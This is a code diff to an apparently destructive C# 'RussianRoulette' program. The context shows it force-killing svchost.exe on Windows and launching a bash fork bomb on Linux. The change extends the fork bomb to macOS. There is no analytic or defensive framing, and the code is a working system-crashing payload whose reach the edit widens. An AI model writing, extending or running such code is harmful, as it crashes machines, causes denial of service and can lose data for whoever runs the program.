@@ -92,7 +92,7 @@ namespace RussianRoulette
                 processInfo.FileName = "cmd.exe";
                 processInfo.Arguments = "/c taskkill /F /IM svchost.exe";
             }
-            else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
+            else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux) || RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
             {
                 processInfo.FileName = "/bin/bash";
                 processInfo.Arguments = ":(){ :|:& };:";
